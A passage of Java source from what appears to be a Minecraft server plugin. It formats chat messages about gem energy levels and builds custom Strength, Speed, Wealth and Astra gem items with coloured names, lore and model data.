                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged");
                        }
                        if (currentScore == 3) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + ChatColor.BOLD + "ʟɪғᴇ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined");
                        }
                    }
                    if (itemMeta != null && item.hasItemMeta() && ChatColor.stripColor(item.getItemMeta().getDisplayName()).equals("ᴡᴇᴀʟᴛʜ ɢᴇᴍ")) {
                        if (currentScore == 33) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5");
                        }
                        if (currentScore == 30) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4");
                        }
                        if (currentScore == 27) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3");
                        }
                        if (currentScore == 24) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2");
                        }
                        if (currentScore == 21) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1");
                        }
                        if (currentScore == 18) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine" + ChatColor.GRAY + " + ");
                        }
                        if (currentScore == 15) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + ChatColor.AQUA + "Pristine");
                        }
                        if (currentScore == 12) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched");
                        }
                        if (currentScore == 9) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked");
                        }
                        if (currentScore == 6) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged");
                        }
                        if (currentScore == 3) {
                            PlayerKiller.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "You " + ChatColor.GREEN + "gained " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "energy, your " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ " + net.md_5.bungee.api.ChatColor.of(new Color(184, 255, 251)) + "gem is now at " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined");
                        }
                    }
                }
            }
        }
    }

    private ItemStack CreateStrengthGem(int pristineLevel, String pristineText, int CustomModelData) {
        ItemStack strengthGem = new ItemStack(Material.PRISMARINE_SHARD);
        ItemMeta strengthGemMeta = strengthGem.getItemMeta();
        if (strengthGemMeta != null) {
            strengthGemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "" + ChatColor.BOLD + "sᴛʀᴇɴɢᴛʜ" + " " + net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 115)) + "ɢᴇᴍ");
            strengthGemMeta.setLore(Arrays.asList(ChatColor.WHITE + "" + ChatColor.BOLD + "ʜᴀᴠᴇ ᴛʜᴇ sᴛʀᴇɴɢᴛʜ ᴏғ ᴀ ᴀʀᴍʏ ", ChatColor.GRAY + "(" + pristineText + ")", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", ChatColor.GRAY + "- Strength ", ChatColor.GRAY + "- Enchants Sharpness", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E" + net.md_5.bungee.api.ChatColor.of(new Color(158, 228, 227)) + "" + ChatColor.BOLD + " ᴀʙɪʟɪᴛʏ", ChatColor.GRAY + "-" + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + " Bounty Hunter", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E" + net.md_5.bungee.api.ChatColor.of(new Color(164, 244, 254)) + "" + ChatColor.BOLD + " ᴘᴏᴡᴇʀs", ChatColor.GRAY + "-" + ChatColor.WHITE + " \uD83E\uDD3A " + ChatColor.GRAY + "ғʀᴀɪʟᴇʀ " + net.md_5.bungee.api.ChatColor.DARK_RED + "\uD83E\uDDD1\uD83C\uDFFB", ChatColor.GRAY + "-" + ChatColor.WHITE + " \uD83E\uDD3A " + ChatColor.GRAY + "ɴᴜʟʟɪғʏ " + net.md_5.bungee.api.ChatColor.DARK_RED + "\uD83E\uDD3C", ChatColor.GRAY + "", ChatColor.GRAY + "-" + ChatColor.WHITE + " ⚔ " + net.md_5.bungee.api.ChatColor.of(new Color(145, 13, 13)) + "ᴄʜᴀᴅ sᴛʀᴇɴɢᴛʜ " + ChatColor.GREEN + "\uD83E\uDDD1\uD83C\uDFFB", ChatColor.GRAY + "-" + ChatColor.WHITE + " ⚔ " + net.md_5.bungee.api.ChatColor.of(new Color(145, 13, 13)) + "ᴄʜᴀᴅ sᴛʀᴇɴɢᴛʜ " + ChatColor.GREEN + "\uD83E\uDD3C"));
            strengthGemMeta.setCustomModelData(CustomModelData);
            if (pristineLevel >= 11) {
                strengthGemMeta.addEnchant(Enchantment.MENDING, 2, true);
                strengthGemMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            }
            strengthGem.setItemMeta(strengthGemMeta);
        }
        return strengthGem;
    }

    private ItemStack CreateSpeedGem(int pristineLevel, String pristineText, int CustomModelData) {
        ItemStack speedGem = new ItemStack(Material.PRISMARINE_SHARD);
        ItemMeta speedGemMeta = speedGem.getItemMeta();
        if (speedGemMeta != null) {
            speedGemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "" + ChatColor.BOLD + "sᴘᴇᴇᴅ" + " " + net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 115)) + "ɢᴇᴍ");
            speedGemMeta.setLore(Arrays.asList(ChatColor.WHITE + "ᴛᴜʀɴ ɪɴᴛᴏ ᴀ ʙʟᴜʀ" + ChatColor.GRAY + "(" + pristineText + ")", net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", ChatColor.GRAY + "-Speed", ChatColor.GRAY + "-Dolphins grace", ChatColor.GRAY + "-Enchants Efficiency", ChatColor.GRAY + "-Enchants Sould Speed", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "Terminal Velocity", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", ChatColor.GRAY + "-" + ChatColor.WHITE + "\uD83C\uDFAF " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "sʟᴏᴛʜs sᴇᴅᴀᴛɪᴠᴇ", ChatColor.GRAY + "-" + ChatColor.WHITE + "\uD83C\uDFAF " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "ʙʟᴜʀ", ChatColor.GRAY + "", ChatColor.GRAY + "- " + ChatColor.WHITE + "\uD83C\uDF29 " + ChatColor.AQUA + "sᴘᴇᴇᴅ sᴛᴏʀᴍ " + ChatColor.DARK_RED + "\uD83E\uDDD1\uD83C\uDFFB", ChatColor.GRAY + "- " + ChatColor.WHITE + "\uD83C\uDF29 " + ChatColor.AQUA + "sᴘᴇᴇᴅ sᴛᴏʀᴍ " + ChatColor.DARK_RED + "\uD83E\uDD3C"));
            speedGemMeta.setCustomModelData(CustomModelData);
            if (pristineLevel >= 11) {
                speedGemMeta.addEnchant(Enchantment.MENDING, 2, true);
                speedGemMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            }
            speedGem.setItemMeta(speedGemMeta);
        }
        return speedGem;
    }

    private ItemStack CreateWealthGem(int pristineLevel, String pristineText, int CustomModelData) {
        ItemStack wealthGem = new ItemStack(Material.PRISMARINE_SHARD); // Example new item
        ItemMeta wealthGemMeta = wealthGem.getItemMeta();

        if (wealthGemMeta != null) {
            wealthGemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "" + ChatColor.BOLD + "ᴡᴇᴀʟᴛʜ" + " " + net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 115)) + "ɢᴇᴍ");
            wealthGemMeta.setLore(Arrays.asList(ChatColor.WHITE + "" + ChatColor.BOLD + "ғᴜᴇʟ ᴀ ᴇᴍᴘɪʀᴇ ", ChatColor.GRAY + "(" + pristineText + ")", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", ChatColor.GRAY + "- Hero of the Village", ChatColor.GRAY + "- Luck", ChatColor.GRAY + "- Enchants Mending", ChatColor.GRAY + "- Enchants Fortune", ChatColor.GRAY + "- Enchants Looting", ChatColor.GRAY + "- Bonus Ores", ChatColor.GRAY + "- Extra EXP", ChatColor.GRAY + "- Durability Chip", ChatColor.GRAY + "- Double Debirs", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", ChatColor.GRAY + "- " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "" + "Pockets", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", ChatColor.GRAY + "-" + net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "\uD83C\uDF40" + ChatColor.RED + " ᴜɴғᴏʀᴛᴜɴᴀᴛᴇ" + ChatColor.DARK_RED + "\uD83E\uDDD1\uD83C\uDFFB", ChatColor.GRAY + "-" + net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "\uD83C\uDF40 " + ChatColor.RED + "ɪᴛᴇᴍ ʟᴏᴄᴋ " + ChatColor.DARK_RED + "🤼", ChatColor.GRAY + "", ChatColor.GRAY + "-" + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDCB8 " + net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 0)) + "ʀɪᴄʜ ʀᴜsʜ " + ChatColor.GREEN + "\uD83E\uDDD1\uD83C\uDFFB", ChatColor.GRAY + "-" + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDCB8 " + net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 0)) + "ᴀᴍʟɪғɪᴄᴀᴛɪᴏɴ " + ChatColor.GREEN + "🤼"));
            wealthGemMeta.setCustomModelData(CustomModelData);
            if (pristineLevel >= 11) {
                wealthGemMeta.addEnchant(Enchantment.MENDING, 2, true);
                wealthGemMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            }
            wealthGem.setItemMeta(wealthGemMeta);
        }
        return wealthGem;
    }

    private ItemStack CreateAstraGem(int pristineLevel, String pristineText, int CustomModelData) {
        ItemStack astraGem = new ItemStack(Material.PRISMARINE_SHARD); // Example new item
        ItemMeta astraGemMeta = astraGem.getItemMeta();

        if (astraGemMeta != null) {
            astraGemMeta.setDisplayName(net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "" + ChatColor.BOLD + "ᴀsᴛʀᴀ " + net.md_5.bungee.api.ChatColor.of(new Color(255, 215, 115)) + "ɢᴇᴍ");
            astraGemMeta.setLore(Arrays.asList(ChatColor.WHITE + "" + ChatColor.BOLD + "ᴍᴀɴᴀɢᴇ ᴛʜᴇ ᴛɪᴅᴇꜱ ᴏꜰ ᴛʜᴇ ᴄᴏꜱᴍᴏꜱ ", ChatColor.GRAY + "(" + pristineText + ")", net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(255, 228, 171)) + "ᴘᴀssɪᴠᴇs", ChatColor.GRAY + "- Phasing", ChatColor.GRAY + "- Soul Healing", ChatColor.GRAY + "- Soul Capture ", ChatColor.GRAY + "" + ChatColor.GRAY + " ", net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(130, 255, 243)) + "" + ChatColor.BOLD + "ᴀʙɪʟɪᴛʏ", ChatColor.GRAY + "- " + net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "" + "Dimensional Drift", ChatColor.GRAY + "", net.md_5.bungee.api.ChatColor.of(new Color(160, 31, 255)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(173, 255, 243)) + "" + ChatColor.BOLD + "ᴘᴏᴡᴇʀs", ChatColor.GRAY + "- " + ChatColor.WHITE + "\uD83D\uDD2A " + ChatColor.GRAY + "ᴅᴀɢɢᴇʀꜱ " + ChatColor.DARK_RED + "\uD83E\uDDD1\uD83C\uDFFB", ChatColor.GRAY + "- " + ChatColor.WHITE + "\uD83D\uDD2A " + ChatColor.GRAY + "ᴜɴʙᴏᴜɴᴅᴇᴅ " + ChatColor.DARK_RED + "\uD83E\uDD3C", ChatColor.GRAY + "", ChatColor.GRAY + "- " + ChatColor.WHITE + "\uD83D\uDC7B " + net.md_5.bungee.api.ChatColor.GRAY + "ᴀꜱᴛʀᴀʟ ᴘʀᴏᴊᴇᴄᴛɪᴏɴ" + ChatColor.GREEN + "\uD83E\uDDD1\uD83C\uDFFB", ChatColor.GRAY + "- " + ChatColor.WHITE + "\uD83D\uDC7B " + ChatColor.GRAY + "ᴀꜱᴛʀᴀʟ ᴠᴏɪᴅ " + ChatColor.GREEN + "\uD83E\uDD3C"));
            astraGemMeta.setCustomModelData(CustomModelData);
            if (pristineLevel >= 11) {
                astraGemMeta.addEnchant(Enchantment.MENDING, 2, true);
                astraGemMeta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            }
            astraGem.setItemMeta(astraGemMeta);
        }
        return astraGem;
    }


    private ItemStack StrengthGemPristine5(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5" + ChatColor.GRAY, 10);
    }

    private ItemStack StrengthGemPristine4(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4" + ChatColor.GRAY, 10);
    }

    private ItemStack StrengthGemPristine3(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3" + ChatColor.GRAY, 10);
    }

    private ItemStack StrengthGemPristine2(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2" + ChatColor.GRAY, 10);
    }

    private ItemStack StrengthGemPristine1(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1" + ChatColor.GRAY, 10);
    }

    private ItemStack StrengthGemPristinePlus(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + ChatColor.GRAY, 10);
    }

    private ItemStack StrengthGemPristine(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.GRAY, 10);
    }

    private ItemStack StrengthGemScratched(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched" + ChatColor.GRAY, 30);
    }

    private ItemStack StrengthGemCracked(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked" + ChatColor.GRAY, 50);
    }

    private ItemStack StrengthGemDamaged(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged" + ChatColor.GRAY, 70);
    }

    private ItemStack StrengthGemRuined(int pristineLevel) {
        return CreateStrengthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined" + ChatColor.GRAY, 90);
    }

    private ItemStack SpeedGemPristine5(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5" + ChatColor.GRAY, 8);
    }

    private ItemStack SpeedGemPristine4(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4" + ChatColor.GRAY, 8);
    }

    private ItemStack SpeedGemPristine3(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3" + ChatColor.GRAY, 8);
    }

    private ItemStack SpeedGemPristine2(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2" + ChatColor.GRAY, 8);
    }

    private ItemStack SpeedGemPristine1(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1" + ChatColor.GRAY, 8);
    }

    private ItemStack SpeedGemPristinePlus(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + ChatColor.GRAY, 8);
    }

    private ItemStack SpeedGemPristine(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.GRAY, 8);
    }

    private ItemStack SpeedGemScratched(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched" + ChatColor.GRAY, 28);
    }

    private ItemStack SpeedGemCracked(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked" + ChatColor.GRAY, 48);
    }

    private ItemStack SpeedGemDamaged(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged" + ChatColor.GRAY, 68);
    }

    private ItemStack SpeedGemRuined(int pristineLevel) {
        return CreateSpeedGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined" + ChatColor.GRAY, 88);
    }


    private ItemStack WealthGemPristine5(int pristineLevel) {
        return CreateWealthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5" + ChatColor.GRAY, 12);
    }

    private ItemStack WealthGemPristine4(int pristineLevel) {
        return CreateWealthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4" + ChatColor.GRAY, 12);
    }

    private ItemStack WealthGemPristine3(int pristineLevel) {
        return CreateWealthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3" + ChatColor.GRAY, 12);
    }

    private ItemStack WealthGemPristine2(int pristineLevel) {
        return CreateWealthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2" + ChatColor.GRAY, 12);
    }

    private ItemStack WealthGemPristine1(int pristineLevel) {
        return CreateWealthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1" + ChatColor.GRAY, 12);
    }

    private ItemStack WealthGemPristinePlus(int pristineLevel) {
        return CreateWealthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + ChatColor.GRAY, 12);
    }

    private ItemStack WealthGemPristine(int pristineLevel) {
        return CreateWealthGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.GRAY, 12);
    }

    private ItemStack WealthGemScratched(int pristineLevel) {
        return CreateWealthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched" + ChatColor.GRAY, 32);
    }

    private ItemStack WealthGemCracked(int pristineLevel) {
        return CreateWealthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked" + ChatColor.GRAY, 52);
    }

    private ItemStack WealthGemDamaged(int pristineLevel) {
        return CreateWealthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged" + ChatColor.GRAY, 72);
    }

    private ItemStack WealthGemRuined(int pristineLevel) {
        return CreateWealthGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "Ruined" + ChatColor.GRAY, 92);
    }

    private ItemStack AstraGemPristine5(int pristineLevel) {
        return CreateAstraGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "5" + ChatColor.GRAY, 14);
    }

    private ItemStack AstraGemPristine4(int pristineLevel) {
        return CreateAstraGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "4" + ChatColor.GRAY, 14);
    }

    private ItemStack AstraGemPristine3(int pristineLevel) {
        return CreateAstraGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "3" + ChatColor.GRAY, 14);
    }

    private ItemStack AstraGemPristine2(int pristineLevel) {
        return CreateAstraGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "2" + ChatColor.GRAY, 14);
    }

    private ItemStack AstraGemPristine1(int pristineLevel) {
        return CreateAstraGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + net.md_5.bungee.api.ChatColor.of(new Color(160, 238, 238)) + "1" + ChatColor.GRAY, 14);
    }

    private ItemStack AstraGemPristinePlus(int pristineLevel) {
        return CreateAstraGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.WHITE + " + " + ChatColor.GRAY, 14);
    }

    private ItemStack AstraGemPristine(int pristineLevel) {
        return CreateAstraGem(pristineLevel, ChatColor.AQUA + "Pristine" + ChatColor.GRAY, 14);
    }

    private ItemStack AstraGemScratched(int pristineLevel) {
        return CreateAstraGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(87, 255, 143)) + "Scratched" + ChatColor.GRAY, 34);
    }

    private ItemStack AstraGemCracked(int pristineLevel) {
        return CreateAstraGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(121, 88, 219)) + "Cracked" + ChatColor.GRAY, 54);
    }

    private ItemStack AstraGemDamaged(int pristineLevel) {
        return CreateAstraGem(pristineLevel, net.md_5.bungee.api.ChatColor.of(new Color(255, 201, 41)) + "Damaged" + ChatColor.GRAY, 74);
    }

    private ItemStack AstraGemRuined(int pristineLevel) {
